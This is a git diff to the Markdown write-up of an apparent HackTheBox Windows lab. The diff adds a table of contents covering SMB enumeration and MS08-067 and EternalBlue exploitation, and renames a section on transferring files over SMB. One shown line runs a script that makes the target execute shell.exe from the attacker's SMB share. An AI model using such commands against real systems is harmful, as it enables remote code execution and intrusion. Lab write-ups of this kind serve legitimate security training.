@@ -3,6 +3,21 @@
 | :-------------------------------- |-------------------------------|
 | **I'm Hades - Red/purple teamer** <br> `Email:` [tuvn@protonmail.com](mailto:tuvn@protonmail.com) <br> <br> `Platform:` [HackTheBox](https://www.hackthebox.eu/profile/167764) \|\| [TryHackMe](https://tryhackme.com/p/leecybersec) \|\| [PentesterLab](https://pentesterlab.com/profile/leecybersec) <br> <br> <img src="http://www.hackthebox.eu/badge/image/167764" alt="Hack The Box"> <br> <br> *Support me at [buymeacoffee](https://www.buymeacoffee.com/leecybersec)* <br> <a href='https://www.buymeacoffee.com/leecybersec' target="blank"><img src="images/bymeacoffee.png" width="200"/></a> | <img src="images/1.png" width="555"/></a> |
 
+# Table of contents
+
+<!-- MarkdownTOC -->
+
+- [Information Gathering](#information-gathering)
+	- [Openning Services](#openning-services)
+	- [Server Message Block](#server-message-block)
+- [Foothold](#foothold)
+	- [Microsoft Windows Server 2000/2003 - Code Execution \(MS08-067\)](#microsoft-windows-server-20002003---code-execution-ms08-067)
+	- [Microsoft Security Bulletin MS17-010 \(EternalBlue/MS17-010\)](#microsoft-security-bulletin-ms17-010-eternalbluems17-010)
+	- [Transfer and execute file using python smb](#transfer-and-execute-file-using-python-smb)
+- [Reference](#reference)
+
+<!-- /MarkdownTOC -->
+
 ## Information Gathering
 
 ### Openning Services
@@ -138,7 +153,7 @@ python cmd.py 10.10.10.4 '\\10.10.14.3\public\shell.exe' > /dev/null
 
 ![](images/6.png)
 
-### Transfer and execute whoami.exe
+### Transfer and execute file using python smb
 
 Create smb server in Kali Machine to check privilege.
 
